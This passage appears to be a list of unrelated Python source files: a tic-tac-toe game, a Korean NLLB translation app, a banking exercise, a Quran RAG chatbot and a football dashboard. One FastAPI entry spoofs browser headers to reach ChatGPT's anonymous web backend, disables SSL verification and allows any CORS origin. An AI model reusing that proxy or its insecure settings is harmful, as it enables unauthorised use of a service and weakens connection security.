WIN\")\n        End = 1\n        \n    elif No_player != 1 and any ( 3 in sub for sub in player_2 ):\n        if mode == 1:\n            print (\"Player 2 wins\")\n        else:\n            print( \"computer wins\")\n        End = 1 \n            \n   \n    if count == 9 and End == 0 :\n        print ( \"     TIE       \\n Both players were equal \")\n        End = 1\n    \n    return End\n        \n\n\nwhile True:\n    mode = int (input (\"0: play with computer, 1: play with 2 players ...\"))\n    if mode == 0 :\n        print (\"play with computer\")\n        print(\"--------------------\")\n        break\n    elif mode == 1 :\n        print (\"two player game\")\n        print(\"--------------------\")\n        break\n    else:\n        print (\"invalid data. TRY AGAIN\")\n\n\n   \nstart_time = time.time ()\n\ngame_board = [[\" - \" , \" - \" , \" - \"],\n              [\" - \" , \" - \" , \" - \"],\n              [\" - \" , \" - \" , \" - \"] ]\n\nshow ()\n\n\nplayer_1 = [[ 0 , 0 , 0 ],\n            [ 0 , 0 , 0 ],\n            [0]]\n\nplayer_2 = [[ 0 , 0 , 0 ],\n            [ 0 , 0 , 0 ],\n            [0]]\n\ncount = 0\nwhile True :\n    End = 0\n    \n    no_player = 1\n    print (\"Turn of Player 1 \")\n        \n    choose_location ( no_player )\n    count += 1\n    show ( )\n    if check_game ( no_player , End) == 1 :\n        break\n\n\n    print (\"-------------------------------\")\n\n        \n    if mode == 1 : \n        no_player = 2\n        print (\"Turn of Player 2\")\n        choose_location ( no_player )\n    else :\n        no_player = 3\n        print (\"Turn of computer\")\n        choose_location ( no_player )\n    show ()\n    count += 1\n    if check_game ( no_player , End) == 1 :\n        break\n    print (\"-------------------------------\")\n\nfinish_time = time.time ()\nprint (\"Time elapsed (in sec ) =  \", finish_time-start_time)",
    "import os, time, datetime, platform\nimport torch\nfrom transformers import AutoTokenizer, AutoModelForSeq2SeqLM, pipeline\nimport nltk\nnltk.download('punkt', quiet=True)\nimport gradio as gr\nfrom langdetect import detect\n\nimport logging\nlogging.getLogger().disabled = True \nlogging.raiseExceptions = False\nimport warnings\nwarnings.filterwarnings('ignore')\n\nclass Dodari:\n    def __init__(self):\n        self.max_len = 512\n        self.selected_files = []\n        self.lang_opt = [\"\ud55c\uad6d\uc5b4\", \"\uc601\uc5b4\", \"\uc77c\ubcf8\uc5b4\"]\n        self.lang_list = ['kor_Hang', 'eng_Latn', 'jpn_Jpan' ]\n        self.origin_lang = None\n        self.target_lang = \"kor_Hang\"\n        self.origin_lang_str = None\n        self.target_lang_str = self.lang_opt[self.lang_list.index(self.target_lang)]\n        self.model_list = ['facebook/nllb-200-distilled-600M', 'facebook/nllb-200-distilled-1.3B', 'facebook/nllb-200-3.3B' ]\n        self.model_opt = [\"4GB \uc774\ud558 - \uc774\ud574\ud560\ub9cc\ud55c \ud004\uc784. \uac00\ub054 \uac1c\uc18c\ub9ac\uac00 \uc11e\uc784\", \"4GB ~ 8GB - \uac00\uc131\ube44 \uc88b\uc740 \ud004. \uc5b4\uca54\ub550 \uaf64 \uc88b\uc74c\", \"8GB\uc774\uc0c1 - \ud004\uc774 \uaf64 \uc88b\uc544\uc9d0. \uc18d\ub3c4\uac00 \ub354 \ube68\ub77c\uc9c0\ub294\uac74 \uc544\ub2d8\"]\n        self.selected_model = 'facebook/nllb-200-distilled-1.3B'\n        self.model = None\n        self.tokenizer = None\n        self.global_trans_script = None\n        self.css = \"\"\"\n            .radio-group .wrap {\n                display: float !important;\n                grid-template-columns: 1fr 1fr;\n            }\n            \"\"\"\n        self.start = '' \n        self.platform = platform.system()\n\n    def main(self):\n        \n        with gr.Blocks(css=self.css, theme=gr.themes.Default(primary_hue=\"red\", secondary_hue=\"pink\")) as app:\n            gr.HTML(\"<h1>\ub2e4\uad6d\uc5b4 AI\ubc88\uc5ed\uae30 '<span style='color:red'>\ub3c4\ub2e4\ub9ac</span>' ver. NLLB \uc785\ub2c8\ub2e4 </h1>\")\n            gr.HTML(\"<p>\uc601\ud55c/\ud55c\uc601 \ubc88\uc5ed\uc5d0 \ud2b9\ud654\ub41c <a target='_blank' href='https://github.com/vEduardovich/dodari'>\uc0c8\ub85c\uc6b4 \ub3c4\ub2e4\ub9ac</a>\ub97c \uc0ac\uc6a9\ud574\ubcf4\uc138\uc694. *.txt\ubfd0\ub9cc \uc544\ub2c8\ub77c *.epup \uc804\uc790\ucc45 \ubc88\uc5ed\ub3c4 \uac00\ub2a5\ud569\ub2c8\ub2e4.</p>\")\n            with gr.Row():\n                with gr.Column(scale=1, min_width=300):\n                    with gr.Tab('\uc21c\uc11c 1'):\n                        gr.Markdown(\"<h3>1. \ubc88\uc5ed\uc774 \ud544\uc694\ud55c \ud30c\uc77c\ub4e4 \uc120\ud0dd</h3>\")\n                        input_window = gr.File(file_count=\"files\", label='\ud30c\uc77c\ub4e4')\n\n                with gr.Column():\n                    with gr.Tab('\uc21c\uc11c 2'):\n                        gr.HTML(\"<h3>2. \ubc88\uc5ed \uc5b8\uc5b4 \uc120\ud0dd</h3>\")\n                        \n                        origin = gr.Textbox(label=\"\uc6d0\ubcf8\", value=None)\n                        gr.HTML(\"<span style='display:block;font-size:2em;text-align:center;'>\u2b07</span> \")\n                        target = gr.Radio( choices=self.lang_opt, label='\ud0c0\uac9f', value=self.target_lang_str)\n                        \n                        \n                        input_window.change(fn=self.change_upload, inputs=input_window, outputs=origin, preprocess=False)\n                        \n                        target.change(fn=self.change_target_lang, inputs=target, outputs=None)\n                with gr.Column():\n                    with gr.Row():\n                        with gr.Tab('\uc21c\uc11c 3'):\n                            gr.HTML(\"<span style='display:flex;'><h3>3. \ubc88\uc5ed\ubaa8\ub378 \uc120\ud0dd</h3> <span style='margin-top:15px;margin-left:10px;color:grey;'>- \ubc88\uc5ed\uc758 \ud488\uc9c8\uc744 \uacb0\uc815\ud569\ub2c8\ub2e4</span></span>\")\n                            \n                            selected_model = gr.Radio(elem_classes=\"radio-group\", choices=self.model_opt, value=\"4GB ~ 8GB - \uac00\uc131\ube44 \uc88b\uc740 \ud004. \uc5b4\uca54\ub550 \uaf64 \uc88b\uc74c\", label='\uc790\uc2e0\uc774 \uac00\uc9c4 \uadf8\ub798\ud53d \uce74\ub4dc \uba54\ubaa8\ub9ac(VRAM)\uc5d0 \ub9de\ucdb0 \uc120\ud0dd\ud569\ub2c8\ub2e4')\n                            selected_model.change(fn=self.change_model, inputs=selected_model)\n                            gr.HTML(\"<div style='text-align:right'><p style = 'color:grey;'>\ucc98\uc74c \uc2e4\ud589\uc2dc \ubaa8\ub378\uc744 \ub2e4\uc6b4\ubc1b\ub294\ub370 \uc544\uc8fc \uc624\ub79c \uc2dc\uac04\uc774 \uac78\ub9bd\ub2c8\ub2e4.</p><p style='color:grey;'>\ucef4\ud4e8\ud130 \uc0ac\uc591\uc774 \uc88b\ub2e4\uba74 \ubc88\uc5ed \uc18d\ub3c4\uac00 \ube68\ub77c\uc9d1\ub2c8\ub2e4.</p><p style='color:grey;'>\ub9e5m1\uc774\uc0c1\uc5d0\uc11c\ub294 mps\ub97c \uc774\uc6a9\ud558\uc5ec \uac00\uc18d\ud569\ub2c8\ub2e4</p></div>\")\n                            graphic_script = \"<a href='https://www.google.com/search?q=%EC%9C%88%EB%8F%84%EC%9A%B0+%EA%B7%B8%EB%9E%98%ED%94%BD++%EB%A9%94%EB%AA%A8%EB%A6%AC+%ED%99%95%EC%9D%B8%ED%95%98%EB%8A%94+%EB%B2%95' target='_blank' style='display:block;text-align:right;'>\ub0b4 \uadf8\ub798\ud53d \uce74\ub4dc \uba54\ubaa8\ub9ac \ud655\uc778\ud558\ub294 \ubc95</a>\"\n                            gr.HTML(graphic_script)\n            with gr.Tab('\uc21c\uc11c 4'):\n                translate_btn = gr.Button(value=\"\ubc88\uc5ed \uc2e4\ud589\ud558\uae30\", size='lg', variant=\"primary\")\n                with gr.Row():\n                    \n                    msg = gr.Textbox(label=\"\uc0c1\ud0dc \uc815\ubcf4\", scale=4, value='\ubc88\uc5ed \ub300\uae30\uc911..')\n                    translate_btn.click(fn=self.translateFn, outputs=msg)\n                    btn_openfolder = gr.Button(value='\ud83d\udcc2 \ubc88\uc5ed \uc644\ub8cc\ud55c \ud30c\uc77c\ub4e4 \ubcf4\uae30', scale=1, variant=\"secondary\")\n                    btn_openfolder.click(fn=lambda: self.open_folder(), inputs=None, outputs=None)\n\n        app.launch(inbrowser=True)\n    def translateFn(self, progress=gr.Progress()):\n        if not self.selected_files : return \"\ubc88\uc5ed\ud560 \ud30c\uc77c\uc744 \ucd94\uac00\ud558\uc138\uc694.\"\n        elif not self.origin_lang : return \"\uc6d0\ubcf8 \uc5b8\uc5b4\ub97c \uc120\ud0dd\ud558\uc138\uc694.\"\n        elif not self.target_lang : return \"\ud0c0\uac9f \uc5b8\uc5b4\ub97c \uc120\ud0dd\ud558\uc138\uc694.\"\n        elif not self.selected_model : return \"\ubc88\uc5ed \ubaa8\ub378\uc744 \uc120\ud0dd\ud574\uc8fc\uc138\uc694.\"\n        \n        self.start = time.time()\n        progress(0, desc=\"\ubc88\uc5ed \ubaa8\ub378\uc744 \uc900\ube44\uc911\uc785\ub2c8\ub2e4...\")\n\n        device = torch.device(\"cuda\" if torch.cuda",
    "import random\nimport string\nimport httpx\nimport asyncio\nimport json\nimport ssl\nimport traceback\nfrom time import time\nfrom uuid import uuid4\n\nfrom fastapi import FastAPI, Request, Response\nfrom fastapi.middleware.cors import CORSMiddleware\nfrom fastapi.responses import StreamingResponse, JSONResponse\n\n# Constants for the server and API configuration\nport = 3040\nbase_url = \"https://chat.openai.com\"\napi_url = f\"{base_url}/backend-api/conversation\"\nrefresh_interval = 600000   # Interval to refresh token in ms\nerror_wait = 120000         # Wait time in ms after an error\n\n# Initialize global variables to store the session token and device ID\ntoken = None\noai_device_id = None\n\n# Initialize FastAPI app\napp = FastAPI()\n\n# Enable CORS\napp.add_middleware(\n    CORSMiddleware,\n    allow_origins=[\"*\"],\n    allow_credentials=True,\n    allow_methods=[\"*\"],\n    allow_headers=[\"*\"],\n)\n\n\n# Custom headers\ncustom_headers = {\n    \"accept\": \"*/*\",\n    \"accept-language\": \"en-US,en;q=0.9\",\n    \"cache-control\": \"no-cache\",\n    \"content-type\": \"application/json\",\n    \"oai-language\": \"en-US\",\n    \"origin\": base_url,\n    \"pragma\": \"no-cache\",\n    \"referer\": base_url,\n    \"sec-ch-ua\": '\"Google Chrome\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"',\n    \"sec-ch-ua-mobile\": \"?0\",\n    \"sec-ch-ua-platform\": '\"Windows\"',\n    \"sec-fetch-dest\": \"empty\",\n    \"sec-fetch-mode\": \"cors\",\n    \"sec-fetch-site\": \"same-origin\",\n    \"user-agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\",\n}\n\n# SSL context for ignoring SSL errors\nssl_context = ssl.create_default_context()\nssl_context.check_hostname = False\nssl_context.verify_mode = ssl.CERT_NONE\n\n\nasync def wait(ms):\n    await asyncio.sleep(ms / 1000.0)\n\n\ndef generate_completion_id(prefix=\"cmpl-\"):\n    characters = string.ascii_letters + string.digits\n    return prefix + ''.join(random.choice(characters) for i in range(28))\n\n\nasync def get_new_session_id():\n    global token, oai_device_id\n    new_device_id = str(uuid4())\n    async with httpx.AsyncClient(headers=custom_headers, verify=False) as client:\n        response = await client.post(\n            f\"{base_url}/backend-anon/sentinel/chat-requirements\",\n            headers={\"oai-device-id\": new_device_id},\n        )\n    print(f\"System: Successfully refreshed session ID and token. {'' if not token else '(Now it\\'s ready to process requests)'}\")\n    oai_device_id = new_device_id\n    token = response.json()[\"token\"]\n\n\nasync def chunks_to_lines(chunks_async):\n    previous = \"\"\n    async for chunk in chunks_async:\n        previous += chunk.decode() if isinstance(chunk, bytes) else chunk\n        eol_index = 0\n        while (eol_index := previous.find(\"\\n\")) >= 0:\n            line = previous[:eol_index + 1].rstrip()\n            if line == \"data: [DONE]\":\n                break\n\n            if line.startswith(\"data: \"):\n                yield line\n\n            previous = previous[eol_index + 1:]\n\n\nasync def lines_to_messages(lines_async):\n    async for line in lines_async:\n        message = line[len(\"data: \"):]\n        yield message\n\n\nasync def stream_completion(data):\n    async for message in lines_to_messages(chunks_to_lines(data)):\n        yield message\n        \n\n@app.post(\"/v1/chat/completions\")\nasync def handle_chat_completion(request: Request):\n    body = await request.json()\n    print(\"---------------------------\")\n    print(body)\n    print(\"---------------------------\")\n    stream_enabled = body.get(\"stream\", False)\n    full_content = ''\n    request_id = generate_completion_id(\"chatcmpl-\")\n\n    try:\n        messages = body.get(\"messages\", [])\n        mapped_messages = [{\n            \"author\": {\"role\": message[\"role\"]},\n            \"content\": {\"content_type\": \"text\", \"parts\": [message[\"content\"]]},\n        } for message in messages]\n\n        async with httpx.AsyncClient(headers=custom_headers, verify=False) as client:\n            response = await client.post(\n                api_url,\n                json={\n                    \"action\": \"next\",\n                    \"messages\": mapped_messages,\n                    \"parent_message_id\": str(uuid4()),\n                    \"model\": \"text-davinci-002-render-sha\",\n                    \"timezone_offset_min\": -180,\n                    \"suggestions\": [],\n                    \"history_and_training_disabled\": True,\n                    \"conversation_mode\": {\"kind\": \"primary_assistant\"},\n                    \"websocket_request_id\": str(uuid4()),\n                },\n                headers={\n                    \"oai-device-id\": oai_device_id,\n                    \"openai-sentinel-chat-requirements-token\": token,\n                },\n                timeout=None,\n            )\n\n        if stream_enabled:\n            headers = {\n                \"Content-Type\": \"text/event-stream\",\n                \"Cache-Control\": \"no-cache\",\n                \"Connection\": \"keep-alive\",\n            }\n            return StreamingResponse(headers=headers, content=sse_response(re",
    "opcao = -1\r\nsaldo = 2000\r\nlimite_saque = 500\r\ntentativas_saque = 3\r\nhistorico_saque = []\r\nhistorico_deposito = []\r\ntexto1 = \"Bem vindo ao nosso sistema\"\r\n\r\nwhile opcao != 0:\r\n    print(f\"\"\"\r\n        ####### {texto1} #######\r\n\r\n\"\"\")\r\n    opcao = int(input(\"[1] Sacar\\n[2] Extrato\\n[3] Depositar\\n[0] Sair\\n: \"))\r\n    if opcao == 1:\r\n        if tentativas_saque > 0:\r\n            saque = float(input(\"Insira o valor de saque: \"))\r\n            if saque > limite_saque:\r\n                print(\"Desculpe, o valor de saque excede o limite permitido.\")\r\n            elif saldo >= saque:\r\n                saldo -= saque\r\n                historico_saque.append(saque)\r\n                print(f\"O seu saque de R${saque:.2f} foi efetuado com sucesso, sobrou R${saldo:.2f} na sua conta para uso.\")\r\n                tentativas_saque -= 1\r\n\r\n            else:\r\n                print(\"Saldo insuficiente.\")\r\n        else:\r\n            print(\"Voc\u00ea atingiu o limite de tentativas de saque.\")\r\n    elif opcao == 2:\r\n        print(\"====================================\")\r\n        print(\"Seu extrato est\u00e1 sendo exibido...\")\r\n        print(f\"Voc\u00ea tem R${saldo:.2f} na conta.\")\r\n        print(\"Hist\u00f3rico de saques:\", historico_saque)\r\n        print(\"Hist\u00f3rico de dep\u00f3sitos:\", historico_deposito)\r\n        print(\"====================================\")\r\n    \r\n    elif opcao == 3:\r\n            deposito = float(input(\"Insira o valor de dep\u00f3sito para a sua conta: \"))\r\n            if deposito > 0:\r\n                saldo += deposito\r\n                historico_deposito.append(deposito)\r\n                print(f\"Dep\u00f3sito em sua conta de R${deposito:.2f} efetuado com sucesso. Seu saldo atual \u00e9 R${saldo:.2f}.\")\r\n            else:\r\n                print(\"O valor de dep\u00f3sito precisa ser positivo.\")\r\n    elif opcao == 0:\r\n        print(\"Obrigado pela escolha do banco. At\u00e9 logo!\")\r\n    else:\r\n        print(\"Op\u00e7\u00e3o inv\u00e1lida.\")\r\n",
    "from langchain_community.embeddings import HuggingFaceInferenceAPIEmbeddings\nfrom langchain_community.vectorstores import FAISS\nfrom langchain_core.prompts import ChatPromptTemplate\nfrom langchain_experimental.text_splitter import SemanticChunker\nfrom langchain_openai.embeddings import OpenAIEmbeddings\nfrom langchain_core.runnables import RunnablePassthrough\nfrom langchain_core.output_parsers import StrOutputParser\nfrom langchain_openai import ChatOpenAI\nimport os \nimport openai\n\n\n# Retrieve the OpenAI API key from the environment variable\nopenai_api_key = os.environ.get(\"OPENAI_API_KEY\")\n# Set the API key for the OpenAI module\nopenai.api_key = openai_api_key\n\n#hugging face API key\nhuggingface_api_key = os.environ.get(\"HUGGINGFACE_HUB_TOKEN\")\n\n\n#reading the raw text file\nwith open(\"Quran.txt\", encoding=\"utf-8\") as f:\n  Quran = f.read()\n\nsemantic_chunker = SemanticChunker(OpenAIEmbeddings(model=\"text-embedding-3-large\"), breakpoint_threshold_type=\"percentile\")\nsemantic_chunks = semantic_chunker.create_documents([Quran])\n\n# huggingface embedding model\nembedding_model = HuggingFaceInferenceAPIEmbeddings(\n    api_key=huggingface_api_key, model_name=\"sentence-transformers/all-MiniLM-l6-v2\"\n)\n\n# setting up the vector store\nsemantic_chunk_vectorstore = FAISS.from_documents(semantic_chunks, embedding=embedding_model)\n\n#retriever\nsemantic_chunk_retriever = semantic_chunk_vectorstore.as_retriever(search_kwargs={\"k\" : 1})\n\nrag_template = \"\"\"\\\nUse the following context to answer the user's query, also try to give reference. If you cannot answer, please respond with 'I'm sorry, I don't know.' and if the user say hello or greeting/how are you something like that you can respond politely and ask him to ask questions regarding Quran.\n\nUser's Query:\n{question}\n\nContext:\n{context}\n\"\"\"\n\nrag_prompt = ChatPromptTemplate.from_template(rag_template)\n\n#generatin part\nbase_model = ChatOpenAI()\n\n\nsemantic_rag_chain = (\n    {\"context\" : semantic_chunk_retriever, \"question\" : RunnablePassthrough()}\n    | rag_prompt\n    | base_model\n    | StrOutputParser()\n)\n\ndef answerable(question):\n  response = semantic_rag_chain.invoke(question)\n  return response",
    "import dash\r\nfrom dash import dcc, html, Input, Output\r\nimport dash_bootstrap_components as dbc\r\nimport pandas as pd\r\nfrom PIL import Image\r\nimport base64\r\nfrom io import BytesIO\r\nimport os\r\nimport plotly.graph_objects as go\r\napp = dash.Dash(__name__, external_stylesheets=[dbc.themes.BOOTSTRAP])\r\n# Get the current working directory\r\ncwd = os.getcwd()\r\nfrom dash.dependencies import Input, Output, State\r\nfrom dash.exceptions import PreventUpdate\r\n\r\n\r\n# Build the path to the image\r\nimage_path = os.path.join(cwd, 'my_dash_app', 'images', '4840654.jpg')\r\nserver = app.server\r\n# Function to convert PIL image to Data URI\r\ndef pil_to_data_uri(img):\r\n    data = BytesIO()\r\n    img.save(data, \"JPEG\")\r\n    data_uri = \"data:image/jpeg;base64,\" + base64.b64encode(data.getvalue()).decode('utf-8')\r\n    return data_uri\r\ndef pil_to_data_uri_logo(img):\r\n    data = BytesIO()\r\n    img.save(data, \"PNG\")\r\n    data_uri = \"data:image/png;base64,\" + base64.b64encode(data.getvalue()).decode('utf-8')\r\n    return data_uri\r\n# run some code for applying logo image\r\nlogo_path = 'images/logo.png'\r\npil_logo = Image.open(logo_path)\r\nlogo_data_uri = pil_to_data_uri_logo(pil_logo)\r\n# same as ^ but for the field image\r\npil_image_path = 'images/4840654.jpg'\r\npil_image = Image.open(pil_image_path)\r\nimage_data_uri = pil_to_data_uri(pil_image)\r\n# load the play button image\r\nplay_img_path = 'images/play_pause.png'\r\nplay_img = Image.open(play_img_path)\r\nplay_img_src = pil_to_data_uri_logo(play_img)\r\n# Load the data\r\n\r\n# Initialize the Dash app\r\n# app = dash.Dash(__name__, external_stylesheets=[dbc.themes.BOOTSTRAP])\r\ndf = pd.read_csv('data/sb_2000_2023.csv', low_memory=False)\r\nteam_directions = df.groupby('game_id')['posteam'].unique().apply(lambda teams: {team: idx for idx, team in enumerate(teams)}).to_dict()\r\n# Define the sidebar layout for selecting game_id\r\n# Define the sidebar layout for selecting game_id\r\n\r\n\r\n# Construct the app layout\r\napp.layout = dbc.Container([\r\n    dbc.Row([\r\n        dbc.Col(\r\n            html.Div([\r\n                html.Img(src=logo_data_uri, style={'height': '100%', 'width': '100%'}),\r\n                html.Hr(),\r\n                dcc.Dropdown(\r\n                    id='game-id-dropdown',\r\n                    options=[{'label': game_id, 'value': game_id} for game_id in df['game_id'].unique()],\r\n                    value=df['game_id'].iloc[0],\r\n                    className='dropdown',\r\n                    clearable=False,\r\n                    style={'background-color': '#fffff', 'color': 'red'}\r\n                ),\r\n            ], className='sidebar'),\r\n            width=2,\r\n            style={'maxWidth': '200px'}  # Set the maximum width of the sidebar\r\n        ),\r\n        dbc.Col([\r\n            dbc.Row([\r\n                dbc.Col([\r\n                    dcc.Graph(\r\n                        id='field-graph',\r\n                        figure={},\r\n                        config={'staticPlot': True}  # Disable zoom and pan\r\n                    ),    html.Img(id='play-pause-button', src=play_img_src, className = 'btnImg', n_clicks=0, style={'cursor': 'pointer', 'height': '50px'}),\r\n\r\ndcc.Interval(\r\n    id='auto-stepper',\r\n    interval=1*1000,  # in milliseconds (e.g., 1000ms = 1 second per step)\r\n    n_intervals=0,\r\n    disabled=True,  # Initially disabled\r\n),\r\n                    dcc.Slider(\r\n                        id='time-slider',\r\n                        className='time-slider',\r\n                        value=df['...1'].min(),\r\n                        marks={str(time): str(time) for time in df['...1'].unique()},\r\n                        updatemode='drag',\r\n                       \r\n                    ),\r\n                ], width=9),\r\n                dbc.Col([\r\n                    html.Div(\r\n                        id='desc-window',\r\n                        className='desc-window',\r\n                        style={'overflow-y': 'scroll', 'height': '150px'},\r\n                    ),\r\n                    dcc.Graph(\r\n                        id='bar-graph',\r\n                        className='small-bar-graph-container'\r\n                    ),\r\n                    html.Div(\r\n                        id='score-dis',\r\n                        className='score-dis',\r\n                        style={'overflow-y': 'scroll', 'height': '200px'},\r\n                    ),\r\n                ], width=3),\r\n            ]),\r\n            dbc.Row(\r\n                dbc.Col(\r\n                    dcc.Graph(\r\n                        id='line-graph',\r\n                        className='centered-container',\r\n                        style={'margin-top': '-100px'},  # Adjust the value as needed to move the graph up\r\n                    ),\r\n                    width=12,\r\n                )\r\n            ),\r\n        ], width=10),\r\n    ]),\r\n], fluid=True)\r\n\r\n# Callback to update the football field and description window based on the selected game_id and time\r\n@app.callback(\r\n    [Output('field-graph', 'figure'), \r\n     Output('bar-graph', 'figure'), \r\n     Output('des"
]